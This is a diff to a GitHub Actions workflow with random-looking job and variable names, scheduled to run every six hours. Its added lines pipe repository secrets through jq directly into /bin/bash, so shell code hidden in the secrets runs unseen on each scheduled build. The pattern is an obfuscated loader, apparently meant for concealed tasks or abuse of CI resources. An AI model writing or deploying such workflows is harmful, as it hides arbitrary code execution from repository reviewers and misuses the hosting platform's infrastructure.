@@ -1,25 +1,18 @@
 name: mingyulu1837
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '42 3/6 * * *'
+    - cron: '18 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: mingyulu1837
         env:
-          kss66273: ${{ secrets.kss66273 }}
+          udmjn015: ${{ secrets.udmjn015 }}
         run: |
-          echo $kss66273 | jq -r .fnn54 | /bin/bash
-          echo $fmpw05 | jq -r .vpsn9 | /bin/bash
-          echo $c5046 | jq -r .unz0993 | /bin/bash
-          echo $sjfb68148 | jq -r .it41 | /bin/bash
-          echo $q699 | jq -r .oedwh3 | /bin/bash
-          echo $k3597 | jq -r .r7249 | /bin/bash
-          echo $gmdy6 | jq -r .vvi8 | /bin/bash
-          echo $wdfey0 | jq -r .uslr533 | /bin/bash
+          echo $udmjn015 | jq -r .lzup0 | /bin/bash
+          echo $m92 | jq -r .tdi97851 | /bin/bash
+          echo $rxwwk5 | jq -r .ssrmg8063 | /bin/bash
 
